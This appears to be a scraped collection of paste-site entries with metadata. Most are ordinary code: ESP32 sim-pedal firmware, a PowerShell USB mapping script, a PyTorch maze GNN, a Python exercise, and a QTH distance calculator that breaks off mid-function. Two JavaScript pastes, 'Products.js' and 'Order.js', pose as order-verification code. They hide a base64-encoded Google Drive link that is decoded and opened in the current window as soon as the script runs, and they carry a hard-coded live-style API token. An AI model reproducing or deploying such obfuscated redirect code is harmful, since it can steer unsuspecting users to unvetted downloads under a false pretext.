uint16_t maxVolts[NUM_PEDALS] = {DEFAULT_MAX_VOLT, DEFAULT_MAX_VOLT, DEFAULT_MAX_VOLT};

// Axis Values
int16_t axisValues[NUM_PEDALS];

// EEPROM Structure (packed to save space)
struct CalibrationData {
  uint16_t minVolts[NUM_PEDALS];
  uint16_t maxVolts[NUM_PEDALS];
  uint16_t checksum;
} __attribute__((packed));

// State Variables
volatile uint8_t buttonFlags = 0;
State currentState = NORMAL;
PedalType activePedal = PEDAL_GAS;
uint16_t stateTicks = 0;
uint16_t minV = 5000, maxV = 0;

void IRAM_ATTR handleButton() {
  static uint32_t lastInterrupt[NUM_PEDALS] = {0};
  uint32_t now = millis();
  uint8_t pins[] = {GAS_BUTTON_PIN, BRAKE_BUTTON_PIN, CLUTCH_BUTTON_PIN};
  
  for(int i = 0; i < NUM_PEDALS; i++) {
    if(!digitalRead(pins[i]) && (now - lastInterrupt[i] > 50)) {
      buttonFlags |= (1 << i);
      lastInterrupt[i] = now;
    }
  }
}

void displayText(const char* line1, const char* line2 = """") {
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(0, 0);
  display.println(line1);
  if (line2[0]) display.println(line2);
  display.display();
}

void updateCalibration(PedalType pedal) {
  uint16_t voltage = ads.computeVolts(ads.readADC_SingleEnded(pedal)) * 1000;  // mV
  minV = min(minV, voltage);
  maxV = max(maxV, voltage);
}

void saveCalibration() {
  CalibrationData data;
  memcpy(data.minVolts, minVolts, sizeof(minVolts));
  memcpy(data.maxVolts, maxVolts, sizeof(maxVolts));
  data.checksum = 0;
  const uint8_t* bytes = (const uint8_t*)&data;
  for (int i = 0; i < sizeof(CalibrationData) - sizeof(uint16_t); i++) {
    data.checksum += bytes[i];
  }
  EEPROM.put(0, data);
}

bool loadCalibration() {
  CalibrationData data;
  EEPROM.get(0, data);
  uint16_t checksum = 0;
  const uint8_t* bytes = (const uint8_t*)&data;
  for (int i = 0; i < sizeof(CalibrationData) - sizeof(uint16_t); i++) {
    checksum += bytes[i];
  }
  if (checksum == data.checksum) {
    memcpy(minVolts, data.minVolts, sizeof(minVolts));
    memcpy(maxVolts, data.maxVolts, sizeof(maxVolts));
    return true;
  }
  return false;
}

int16_t applyDeadZone(uint16_t value, uint16_t minV, uint16_t maxV) {
  uint32_t range = maxV - minV;
  uint32_t deadZone = (range * DEAD_ZONE_PCT) / 100;
  uint32_t activeRange = range - (2 * deadZone);
  
  if (value <= minV + deadZone) return 0;
  if (value >= maxV - deadZone) return 32767;
  
  return ((value - (minV + deadZone)) * 32767UL) / activeRange;
}

void setup() {
  Wire.begin(SDA_PIN, SCL_PIN);
  pinMode(GAS_BUTTON_PIN, INPUT_PULLUP);
  pinMode(BRAKE_BUTTON_PIN, INPUT_PULLUP);
  pinMode(CLUTCH_BUTTON_PIN, INPUT_PULLUP);
  attachInterrupt(digitalPinToInterrupt(GAS_BUTTON_PIN), handleButton, FALLING);
  attachInterrupt(digitalPinToInterrupt(BRAKE_BUTTON_PIN), handleButton, FALLING);
  attachInterrupt(digitalPinToInterrupt(CLUTCH_BUTTON_PIN), handleButton, FALLING);

  // Initialize display with timeout
  unsigned long start = millis();
  bool displaySuccess = false;
  while (millis() - start < 1000 && !displaySuccess) {
      displaySuccess = display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
      if (!displaySuccess) {
          delay(10);
      }
  }
  if (!displaySuccess) {
      while (1); // Halt
  }

  // Initialize ADC with timeout
  start = millis();
  bool adcSuccess = false;
  while (millis() - start < 1000 && !adcSuccess) {
      adcSuccess = ads.begin(0x48);
      if (!adcSuccess) {
          delay(10);
      }
  }
  if (!adcSuccess) {
      char buffer[20];
      strcpy_P(buffer, adcErrorStr);
      displayText(buffer);
      while (1);
  }
  ads.setGain(GAIN_TWOTHIRDS);

  char buffer[20];
  strcpy_P(buffer, simPedalsStr);
  displayText(buffer);
  usb_hid.setReportDescriptor(hid_report_descriptor, sizeof(hid_report_descriptor));
  usb_hid.begin();
  bleGamepad.begin();

  if (!loadCalibration()) {
    for (int i = 0; i < NUM_PEDALS; i++) {
      minVolts[i] = DEFAULT_MIN_VOLT;
      maxVolts[i] = DEFAULT_MAX_VOLT;
    }
    saveCalibration();
  }
}

void loop() {
  // Handle state machine
  if (buttonFlags) {
    for (int i = 0; i < NUM_PEDALS; i++) {
      if (buttonFlags & (1 << i)) {
        activePedal = (PedalType)i;
        currentState = CALIBRATING;
        stateTicks = 0;
        minV = 5000;
        maxV = 0;
        buttonFlags &= ~(1 << i);
        char pedalName[10];
        strcpy_P(pedalName, (PGM_P)pgm_read_word(&(pedalNames[i])));
        char buffer[20];
        snprintf(buffer, sizeof(buffer), ""%s Calibration"", pedalName);
        char buffer2[20];
        strcpy_P(buffer2, pressPedalStr);
        displayText(buffer, buffer2);
        break;
      }
    }
  }

  if (currentState != NORMAL) {
    stateTicks++;
    if (currentState == CALIBRATING) {
      updateCalibration(activePedal);
      if (stateTicks >= CALIBRATION_TICKS) {
        minVolts[activePedal] = minV;
        maxVolts[activePedal] = maxV;
        saveCalibration();
        currentState = NORMAL;
      } else if (stateTicks == 300) {  // 3s delay before sampling
        char buffer[20];
        strcpy_P(buffer, releasePedalStr);
        displayText(buffer);
      }
    } else if (currentState == RESETTING) {
      if (stateTicks >= RESET_TICKS) {
        minVolts[activePedal] = DEFAULT_MIN_VOLT;
        maxVolts[activePedal] = DEFAULT_MAX_VOLT;
        saveCalibration();
        currentState = NORMAL;
      }
    }
    static const uint8_t buttonPins[] = {GAS_BUTTON_PIN, BRAKE_BUTTON_PIN, CLUTCH_BUTTON_PIN};
    if (stateTicks >= DEBOUNCE_TICKS && digitalRead(buttonPins[activePedal]) == LOW) {
      currentState = RESETTING;
      stateTicks = 0;
      char pedalName[10];
      strcpy_P(pedalName, (PGM_P)pgm_read_word(&(pedalNames[activePedal])));
      char buffer[20];
      snprintf(buffer, sizeof(buffer), ""%s Reset"", pedalName);
      char buffer2[20];
      strcpy_P(buffer2, resetToDefaultsStr);
      displayText(buffer, buffer2);
    }
    delay(10);
    return;
  }

  // Normal operation
  int16_t rawValues[NUM_PEDALS];
  bool adcError = false;
  for (int i = 0; i < NUM_PEDALS; i++) {
    rawValues[i] = ads.readADC_SingleEnded(i);
    if (rawValues[i] < 0) adcError = true;
  }

  if (adcError) {
    char buffer[20];
    strcpy_P(buffer, adcErrorStr);
    displayText(buffer, F(""Read Error""));
    delay(1000);
    return;
  }

  uint16_t voltages[NUM_PEDALS];
  for (int i = 0; i < NUM_PEDALS; i++) {
    voltages[i] = ads.computeVolts(rawValues[i]) * 1000;  // mV
    axisValues[i] = applyDeadZone(voltages[i], minVolts[i], maxVolts[i]);
  }

  if (usb_hid.ready()) {
    uint8_t report[6];
    for (int i = 0; i < NUM_PEDALS; i++) {
      report[i * 2] = axisValues[i] & 0xFF;
      report[i * 2 + 1] = axisValues[i] >> 8;
    }
    usb_hid.sendReport(1, report, 6);
  }
  if (bleGamepad.isConnected()) {
    bleGamepad.setAxes(axisValues[PEDAL_GAS], axisValues[PEDAL_BRAKE], axisValues[PEDAL_CLUTCH], 0, 0, 0, 0, DPAD_CENTERED);
  }

  float brakeVolts = voltages[PEDAL_BRAKE] / 1000.0f;  // Convert back to volts
  float brakePSI = constrain(((brakeVolts - (minVolts[PEDAL_BRAKE] / 1000.0f)) / ((maxVolts[PEDAL_BRAKE] / 1000.0f) - (minVolts[PEDAL_BRAKE] / 1000.0f))) * 100.0f, 0.0f, 100.0f);
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(0, 0);
  display.print(usb_hid.ready() ? ""USB"" : (bleGamepad.isConnected() ? ""BT"" : """"));
  display.setTextSize(2);
  display.setCursor(40, 16);
  display.println(""Brake"");
  display.setCursor(28, 40);
  display.print(brakePSI, 2);
  display.print(F("" PSI""));
  display.display();

  delay(5);
}"
gE5hET5K,MapDevices,J2897,PowerShell,Saturday 29th of March 2025 08:12:51 AM CDT,"# Define the mappings for DeviceID to SourceDirectory and TargetDirectory
$deviceMappings = @{
    ""USBSTOR\DISK&VEN_FAKE&PROD_FLASH_DRIVE&REV_2.10\SN1234567890&0"" = @{
        SourceDirectory = ""DataToSync""
        TargetDirectory = ""C:\Backup\USBFlashDrive""
    }
    ""USBSTOR\DISK&VEN_GENERIC&PROD_USB_DISK&REV_6.50\4&ABCDEF12&0&_&0"" = @{
        SourceDirectory = ""Test""
        TargetDirectory = ""C:\Flash\GeneralUDisk\Test""
    }
    ""USBSTOR\DISK&VEN_VIRTUAL&PROD_STORAGE&REV_0001\ZZ9012345678&0"" = @{
        SourceDirectory = ""ImportantDocs""
        TargetDirectory = ""C:\Archive\ST8GBDrive""
    }
}

# Get the USB devices and create custom objects with the required properties
$usbDevices = Get-PnpDevice | Where-Object { $_.DeviceID -like ""USBSTOR*"" }

$customObjects = foreach ($device in $usbDevices) {
    $deviceId = $device.DeviceID
    $status = $device.Status

    if ($deviceMappings.ContainsKey($deviceId)) {
        [PSCustomObject]@{
            DeviceID        = $deviceId
            SourceDirectory = $deviceMappings[$deviceId].SourceDirectory
            TargetDirectory = $deviceMappings[$deviceId].TargetDirectory
        }
    } else {
        [PSCustomObject]@{
            DeviceID        = $deviceId
            SourceDirectory = ""NotMapped""
            TargetDirectory = ""NotMapped""
        }
    }
}

# Export the custom objects to a CSV file
$customObjects | Export-Csv -Path ""C:\Users\J2897\DeviceMapping.csv"" -NoTypeInformation"
Max6sP1h,Untitled,sicanus,Python,Saturday 29th of March 2025 08:06:38 AM CDT,"import torch
import torch.nn as nn
import torch.optim as optim
from torch_geometric.loader import DataLoader
from torch_geometric.nn import MessagePassing
import numpy as np
import torch.nn.functional as F
from sklearn.metrics import f1_score
from copy import deepcopy

# You can copy/paste helper functions from the task description here.

# Do not change function signature
def init_model():
  # Your code
  device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
  model = MazeGNN(input_dim=2, hidden_dim=64, output_dim=2, dropout=0.3).to(device)
  return model
  
def train_model(model, train_generator):
  dataset = train_generator(n_samples=10000)
  # Your code
  criterion = torch.nn.NLLLoss()
  optimizer = optim.Adam(model.parameters())

  val_split = 0.2
  train_size = int(val_split*len(dataset))
  train_loader = DataLoader(dataset[:train_size], batch_size=1, shuffle=True)
  val_set = DataLoader(dataset[train_size:], batch_size = 1)
  device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')

  model.train()

  worst_loss = -1
  best_model = None
  epochs = 4

  for epoch in range(epochs):
      running_loss = 0.0
      for i, data in enumerate(train_loader):
          optimizer.zero_grad()
          data = data.to(device)

          # could change additional parameters here
          pred = model(data, data.num_nodes)

          loss = criterion(pred, data.y.to(torch.long))

          loss.backward()
          torch.nn.utils.clip_grad_norm_(model.parameters(), 1.0)
          optimizer.step()

          running_loss += loss.item()
      ss = eval_model(model, val_set)

      graph_val = float((ss.split("" "")[-1]))
      print(f'Epoch: {epoch + 1} loss: {running_loss / len(train_loader.dataset):.5f} \t {ss}')
      comp = (-graph_val, running_loss)
      if worst_loss == -1 or comp < worst_loss:
          worst_loss = comp
          best_model = deepcopy(model)
          print(""store new best model"", comp)

      running_loss = 0.0
  return best_model

  

# --- Helper Functions (Copied from description) ---

def eval_model(model, dataset, mode=None):
  model.eval()
  device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
  acc = 0
  tot_nodes = 0
  tot_graphs = 0
  perf = 0
  gpred = []
  gsol = []

  for step, batch in enumerate(dataset):
    if batch is None: continue
    n = batch.num_nodes
    with torch.no_grad():
      batch = batch.to(device)
      try:
       pred = model(batch, n)
      except TypeError:
        pred = model(batch)

    if mode == ""small"":
      if n > 4*4:
        continue
    elif mode == ""medium"":
      if n <= 4*4 or n > 8*8:
        continue
    elif mode == ""large"":
      if n <= 8*8 or n > 16*16:
        continue
    elif mode == ""xlarge"":
      if n <= 16*16 or n > 32*32:
        continue


    y_pred = torch.argmax(pred,dim=1)
    tot_nodes += n
    tot_graphs += batch.num_graphs

    if hasattr(batch, 'y') and batch.y is not None and len(batch.y) == n:
      graph_acc = torch.sum(y_pred == batch.y).item()
      acc += graph_acc
      for p in y_pred:
        gpred.append(int(p.item()))
      for p in batch.y:
        gsol.append(int(p.item()))
      if graph_acc == n:
        perf += 1
    else:
      print(f""Warning: Missing or malformed ground truth for graph {step}. Skipping accuracy calculation for this graph."")


  if tot_nodes == 0 or tot_graphs == 0:
    return ""node accuracy: N/A | node f1 score: N/A | graph accuracy: N/A (No valid graphs processed)""

  gpred_tensor = torch.tensor(gpred, device='cpu')
  gsol_tensor = torch.tensor(gsol, device='cpu')

  f1score = f1_score(gsol_tensor.numpy(), gpred_tensor.numpy(), average='binary', zero_division=0)

  return f""node accuracy: {acc/tot_nodes:.3f} | node f1 score: {f1score:.3f} | graph accuracy: {perf/tot_graphs:.3f}""

class MazeConv(MessagePassing):
  def __init__(self, hidden_dim, dropout=0.2):
    super(MazeConv, self).__init__(aggr='add')
    self.dropout = dropout
    
    self.mlp_message = nn.Sequential(
      nn.Linear(2 * hidden_dim, hidden_dim),
      nn.ReLU(),
      nn.Dropout(self.dropout),
      nn.Linear(hidden_dim, hidden_dim),
    )
    
    self.mlp_update = nn.Sequential(
      nn.Linear(hidden_dim, hidden_dim),
      nn.ReLU(),
      nn.Dropout(self.dropout)
    )
    
    self.norm = nn.LayerNorm(hidden_dim)

  def forward(self, x, edge_index):
    aggregated_messages = self.propagate(edge_index, x=x)

    out = x + aggregated_messages
    out = self.mlp_update(out)
    out = self.norm(out)

    return out

  def message(self, x_j, x_i):
    edge_features = torch.cat([x_i, x_j], dim=-1)

    msg = self.mlp_message(edge_features)
    return msg

class MazeGNN(torch.nn.Module):
  def __init__(self, input_dim=2, hidden_dim=64, output_dim=2, dropout=0.3):
    super().__init__()
    self.dropout = dropout
    self.hidden_dim = hidden_dim
    self.input_dim = input_dim
    self.encoder = self.get_mlp(input_dim, hidden_dim * 2, hidden_dim)
    self.decoder = self.get_mlp(hidden_dim, hidden_dim * 2, output_dim, last_relu=False)
    self.conv = MazeConv(hidden_dim, dropout=self.dropout)
    self.pre_conv_mlp = self.get_mlp(hidden_dim + input_dim, hidden_dim * 2, hidden_dim)

  def get_mlp(self, input_dim, hidden_layer_dim, output_dim, last_relu=True):
    modules = [
      torch.nn.Linear(input_dim, int(hidden_layer_dim)),
      torch.nn.ReLU(),
      torch.nn.Dropout(self.dropout),
      torch.nn.Linear(int(hidden_layer_dim), output_dim)
    ]
    if last_relu:
      modules.append(torch.nn.ReLU())
    return torch.nn.Sequential(*modules)

  def forward(self, data, num_nodes):
    x, edge_index = data.x, data.edge_index
    original_input = x
    x = self.encoder(x) 
    num_layers = 32 

    for i in range(num_layers):
      combined_features = torch.cat([x, original_input], dim=-1)
      processed_features = self.pre_conv_mlp(combined_features)
      x = self.conv(processed_features, edge_index)

    x = self.decoder(x)
    return F.log_softmax(x, dim=1)"
UynQ4WyD,MPV pw.conf error fix,metalx1000,Bash,Saturday 29th of March 2025 07:55:50 AM CDT,"#If you are getting an error with mpv that says something like this:
#  [W][08:49:15.547738] pw.conf      | 
#[conf.c: 1204 pw_conf_load_conf_for_context()] 
#setting config.name to client-rt.conf is deprecated, using client.conf

#Then set the default audio device like this
vim ~/.config/mpv/config
audio-device=pulse"
Jnbd5LUR,Esp32s3 Ssd1306 ADS1115 W/ Calibration,LandoRo,C#,Saturday 29th of March 2025 07:53:05 AM CDT,"#include <Wire.h>
#include <Adafruit_ADS1X15.h>
#include <Adafruit_SSD1306.h>
#include <BleGamepad.h>
#include <Adafruit_TinyUSB.h>
#include ""tusb.h""
#include <EEPROM.h>

// OLED Config
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// ADS1115 Instance
Adafruit_ADS1115 ads;

// BLE Gamepad Instance
BleGamepad bleGamepad(""Generic Sim Pedals BLE"", ""xAI"", 100);

// USB HID Instance
Adafruit_USBD_HID usb_hid;

// HID Report Descriptor (3-axis joystick)
static const uint8_t hid_report_descriptor[] = {0x05, 0x01, 0x09, 0x05, 0xA1, 0x01, 0x85, 0x01, 0x09, 0x30, 0x09, 0x31, 0x09, 0x32, 0x15, 0x00, 0x26, 0xFF, 0x7F, 0x75, 0x10, 0x95, 0x03, 0x81, 0x02, 0xC0};

// Pins
#define SDA_PIN 9
#define SCL_PIN 10
#define GAS_BUTTON_PIN 2
#define BRAKE_BUTTON_PIN 3
#define CLUTCH_BUTTON_PIN 4

// Constants
const uint16_t DEFAULT_MIN_VOLT = 500;  // mV
const uint16_t DEFAULT_MAX_VOLT = 4500; // mV
const uint8_t DEAD_ZONE_PCT = 5;        // 5%
const uint16_t CALIBRATION_TICKS = 1000;// 10s @ 10ms/tick
const uint16_t RESET_TICKS = 500;       // 5s @ 10ms/tick
const uint16_t DEBOUNCE_TICKS = 50;     // 0.5s @ 10ms/tick

enum PedalType { PEDAL_GAS = 0, PEDAL_BRAKE = 1, PEDAL_CLUTCH = 2, NUM_PEDALS = 3 };
enum State { NORMAL, CALIBRATING, RESETTING };

// Calibration Values (in mV)
uint16_t minVolts[NUM_PEDALS] = {DEFAULT_MIN_VOLT, DEFAULT_MIN_VOLT, DEFAULT_MIN_VOLT};
uint16_t maxVolts[NUM_PEDALS] = {DEFAULT_MAX_VOLT, DEFAULT_MAX_VOLT, DEFAULT_MAX_VOLT};

// Axis Values
int16_t axisValues[NUM_PEDALS];

// EEPROM Structure (packed to save space)
struct CalibrationData {
  uint16_t minVolts[NUM_PEDALS];
  uint16_t maxVolts[NUM_PEDALS];
  uint16_t checksum;
} __attribute__((packed));

// State Variables
volatile uint8_t buttonFlags = 0;
State currentState = NORMAL;
PedalType activePedal = PEDAL_GAS;
uint16_t stateTicks = 0;
uint16_t minV = 5000, maxV = 0;

void IRAM_ATTR handleButton() {
  static uint32_t lastInterrupt = 0;
  uint32_t now = millis();
  if (now - lastInterrupt < 50) return;  // Debounce 50ms
  lastInterrupt = now;

  if (!digitalRead(GAS_BUTTON_PIN)) buttonFlags |= (1 << PEDAL_GAS);
  if (!digitalRead(BRAKE_BUTTON_PIN)) buttonFlags |= (1 << PEDAL_BRAKE);
  if (!digitalRead(CLUTCH_BUTTON_PIN)) buttonFlags |= (1 << PEDAL_CLUTCH);
}

void displayText(const char* line1, const char* line2 = """") {
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(0, 0);
  display.println(line1);
  if (line2[0]) display.println(line2);
  display.display();
}

void updateCalibration(PedalType pedal) {
  uint16_t voltage = ads.computeVolts(ads.readADC_SingleEnded(pedal)) * 1000;  // mV
  minV = min(minV, voltage);
  maxV = max(maxV, voltage);
}

void saveCalibration() {
  CalibrationData data;
  memcpy(data.minVolts, minVolts, sizeof(minVolts));
  memcpy(data.maxVolts, maxVolts, sizeof(maxVolts));
  data.checksum = 0;
  const uint8_t* bytes = (const uint8_t*)&data;
  for (int i = 0; i < sizeof(CalibrationData) - sizeof(uint16_t); i++) {
    data.checksum += bytes[i];
  }
  EEPROM.put(0, data);
}

bool loadCalibration() {
  CalibrationData data;
  EEPROM.get(0, data);
  uint16_t checksum = 0;
  const uint8_t* bytes = (const uint8_t*)&data;
  for (int i = 0; i < sizeof(CalibrationData) - sizeof(uint16_t); i++) {
    checksum += bytes[i];
  }
  if (checksum == data.checksum) {
    memcpy(minVolts, data.minVolts, sizeof(minVolts));
    memcpy(maxVolts, data.maxVolts, sizeof(maxVolts));
    return true;
  }
  return false;
}

int16_t applyDeadZone(uint16_t value, uint16_t minV, uint16_t maxV) {
  uint32_t range = maxV - minV;
  uint32_t deadZone = (range * DEAD_ZONE_PCT) / 100;
  uint32_t activeRange = range - (2 * deadZone);
  
  if (value <= minV + deadZone) return 0;
  if (value >= maxV - deadZone) return 32767;
  
  return ((value - (minV + deadZone)) * 32767UL) / activeRange;
}

void setup() {
  Wire.begin(SDA_PIN, SCL_PIN);
  pinMode(GAS_BUTTON_PIN, INPUT_PULLUP);
  pinMode(BRAKE_BUTTON_PIN, INPUT_PULLUP);
  pinMode(CLUTCH_BUTTON_PIN, INPUT_PULLUP);
  attachInterrupt(digitalPinToInterrupt(GAS_BUTTON_PIN), handleButton, FALLING);
  attachInterrupt(digitalPinToInterrupt(BRAKE_BUTTON_PIN), handleButton, FALLING);
  attachInterrupt(digitalPinToInterrupt(CLUTCH_BUTTON_PIN), handleButton, FALLING);

  if (!ads.begin(0x48)) {
    display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
    displayText(""ADC Error"");
    while (1);
  }
  ads.setGain(GAIN_TWOTHIRDS);

  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    while (1);
  }
  
  displayText(""Sim Pedals"");
  usb_hid.setReportDescriptor(hid_report_descriptor, sizeof(hid_report_descriptor));
  usb_hid.begin();
  bleGamepad.begin();

  if (!loadCalibration()) {
    for (int i = 0; i < NUM_PEDALS; i++) {
      minVolts[i] = DEFAULT_MIN_VOLT;
      maxVolts[i] = DEFAULT_MAX_VOLT;
    }
    saveCalibration();
  }
}

void loop() {
  // Handle state machine
  if (buttonFlags) {
    for (int i = 0; i < NUM_PEDALS; i++) {
      if (buttonFlags & (1 << i)) {
        activePedal = (PedalType)i;
        currentState = CALIBRATING;
        stateTicks = 0;
        minV = 5000;
        maxV = 0;
        buttonFlags &= ~(1 << i);
        const char* names[] = {""Gas"", ""Brake"", ""Clutch""};
        displayText((String(names[i]) + "" Calibration"").c_str(), ""Press pedal fully"");
        break;
      }
    }
  }

  if (currentState != NORMAL) {
    stateTicks++;
    if (currentState == CALIBRATING) {
      updateCalibration(activePedal);
      if (stateTicks >= CALIBRATION_TICKS) {
        minVolts[activePedal] = minV;
        maxVolts[activePedal] = maxV;
        saveCalibration();
        currentState = NORMAL;
      } else if (stateTicks == 300) {  // 3s delay before sampling
        displayText(""Release pedal"");
      }
    } else if (currentState == RESETTING) {
      if (stateTicks >= RESET_TICKS) {
        minVolts[activePedal] = DEFAULT_MIN_VOLT;
        maxVolts[activePedal] = DEFAULT_MAX_VOLT;
        saveCalibration();
        currentState = NORMAL;
      }
    }
    static const uint8_t buttonPins[] = {GAS_BUTTON_PIN, BRAKE_BUTTON_PIN, CLUTCH_BUTTON_PIN};
    if (stateTicks >= DEBOUNCE_TICKS && digitalRead(buttonPins[activePedal]) == LOW) {
      currentState = RESETTING;
      stateTicks = 0;
      const char* names[] = {""Gas"", ""Brake"", ""Clutch""};
      displayText((String(names[activePedal]) + "" Reset"").c_str(), ""to Defaults"");
    }
    delay(10);
    return;
  }

  // Normal operation
  int16_t rawValues[NUM_PEDALS];
  bool adcError = false;
  for (int i = 0; i < NUM_PEDALS; i++) {
    rawValues[i] = ads.readADC_SingleEnded(i);
    if (rawValues[i] < 0) adcError = true;
  }

  if (adcError) {
    displayText(""ADC Read"", ""Error"");
    delay(1000);
    return;
  }

  uint16_t voltages[NUM_PEDALS];
  for (int i = 0; i < NUM_PEDALS; i++) {
    voltages[i] = ads.computeVolts(rawValues[i]) * 1000;  // mV
    axisValues[i] = applyDeadZone(voltages[i], minVolts[i], maxVolts[i]);
  }

  if (usb_hid.ready()) {
    uint8_t report[6];
    for (int i = 0; i < NUM_PEDALS; i++) {
      report[i * 2] = axisValues[i] & 0xFF;
      report[i * 2 + 1] = axisValues[i] >> 8;
    }
    usb_hid.sendReport(1, report, 6);
  }
  if (bleGamepad.isConnected()) {
    bleGamepad.setAxes(axisValues[PEDAL_GAS], axisValues[PEDAL_BRAKE], axisValues[PEDAL_CLUTCH], 0, 0, 0, 0, DPAD_CENTERED);
  }

  float brakeVolts = voltages[PEDAL_BRAKE] / 1000.0f;  // Convert back to volts
  float brakePSI = constrain(((brakeVolts - (minVolts[PEDAL_BRAKE] / 1000.0f)) / ((maxVolts[PEDAL_BRAKE] / 1000.0f) - (minVolts[PEDAL_BRAKE] / 1000.0f))) * 100.0f, 0.0f, 100.0f);
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(0, 0);
  display.print(usb_hid.ready() ? ""USB"" : (bleGamepad.isConnected() ? ""BT"" : """"));
  display.setTextSize(2);
  display.setCursor(40, 16);
  display.println(""Brake"");
  display.setCursor(28, 40);
  display.print(brakePSI, 2);  // 2 decimal places
  display.print("" PSI"");
  display.display();

  delay(5);
}"
XEHJTEQJ,Products.js,navrajkhunger,JavaScript,Saturday 29th of March 2025 07:46:31 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/892/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
q94Y0C8v,Interesting,dllbridge,C,Saturday 29th of March 2025 07:32:46 AM CDT,"
#include <windows.h>
#include   <stdio.h>



/////////////////////////////////////////////////////////////////
int main()                                                     // 
{
	
    POINT cursorPos;
    
	while(1) 
	{
        GetCursorPos(&cursorPos);
        printf(""X: %ld, Y: %ld | "", cursorPos.x, cursorPos.y);
        
        if (GetAsyncKeyState(VK_LBUTTON)) printf(""L_Click "");
        if (GetAsyncKeyState(VK_RBUTTON)) printf(""R_Click "");
        
        printf(""\n"");
        Sleep (1000);               
    }

return 0;
}

"
6S345uF6,Order.js,navrajkhunger,JavaScript,Saturday 29th of March 2025 07:31:08 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/884/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kjTYGjxd,14 52025 + 5400 – х,nq1s788,Python,Saturday 29th of March 2025 07:18:14 AM CDT,"#14 https://kpolyakov.spb.ru/school/ege/gen.php?action=viewVar&answers=on&varId=2
n = 5 ** 8
answ = (0, 0) #кол-во четверок, x
for x in range(10, 70001):
    r = n - x
    cnt = 0
    while r != 0:
        if r % 5 == 4:
            cnt += 1
        r //= 5
    answ = max(answ, (cnt, x))
print(answ)"
HnXFQN8f,Calculator Distanță QTH,yo9gjx,Java 5,Saturday 29th of March 2025 07:17:45 AM CDT,"<!DOCTYPE html>
<html lang=""ro"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Calculator Distanță QTH</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        input, button {
            padding: 8px;
            margin: 5px;
        }
    </style>
</head>
<body>
    <h1>Calculator Distanță QTH</h1>
    <label for=""qth1"">QTH Locator 1:</label>
    <input type=""text"" id=""qth1"" placeholder=""Ex. JN48QM""><br>
    <label for=""qth2"">QTH Locator 2:</label>
    <input type=""text"" id=""qth2"" placeholder=""Ex. KN25UD""><br>
    <button onclick=""calculateDistance()"">Calculează Distanța</button>
    <p id=""result""></p>

    <script>
        // Funcție pentru a converti QTH locator în latitudine și longitudine
        function qthToLatLon(qth) {
            if (qth.length < 6) return null;

            qth = qth.toUpperCase();
            const fieldLon = (qth.charCodeAt(0) - 65) * 20 - 180; // Primele 2 caractere (câmp)
            const fieldLat = (qth.charCodeAt(1) - 65) * 10 - 90;
            const squareLon = parseInt(qth.charAt(2)) * 2; // Următoarele 2 cifre (pătrat)
            const squareLat = parseInt(qth.charAt(3)) * 1;
            const subSquareLon = (qth.charCodeAt(4) - 65) * (2 / 24); // Ultimele 2 litere (subpătrat)
            const subSquareLat = (qth.charCodeAt(5) - 65) * (1 / 24);

            const lon = fieldLon + squareLon + subSquareLon + (2 / 24 / 2); // Centrul subpătratului
            const lat = fieldLat + squareLat + subSquareLat + (1 / 24 / 2);

            return { lat, lon };
        }

        // Funcție pentru calculul distanței Haversine
        function haversineDistance(lat1, lon1, lat2, lon2) {
            const R = 6371; // Raza Pământului în kilometri
            const dLat = (lat2 - lat1) * Math.PI / 180;
            const dLon = (lon2 - lon1) * Math.PI / 180;
            const a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
